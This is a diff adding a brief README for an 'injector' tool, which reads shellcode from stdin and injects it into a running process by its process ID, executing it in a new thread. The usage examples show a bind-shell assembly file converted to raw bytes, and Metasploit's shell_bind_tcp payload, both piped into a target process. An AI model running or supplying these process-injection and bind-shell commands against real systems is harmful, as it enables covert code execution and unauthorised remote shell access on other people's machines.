@@ -1,0 +1,13 @@
+'injector' takes 1 argument, the pid of the process and reads shellcode's
+raw bytes from stdin. after that it creates a payload that will execute the
+shellcode in a new thread and it injects it to the process.
+
+Examples: (assume pid = 1234)
+
+Ex1:
+    as bind_sh_32.s -o bind_sh_32.o
+    objcopy -O binary bind_sh_32.o bind_sh_32.bin
+    ./injector 1234 < bind_sh_32.bin
+
+Ex2:
+    msfpayload linux/x86/shell_bind_tcp R | ./injector 1234
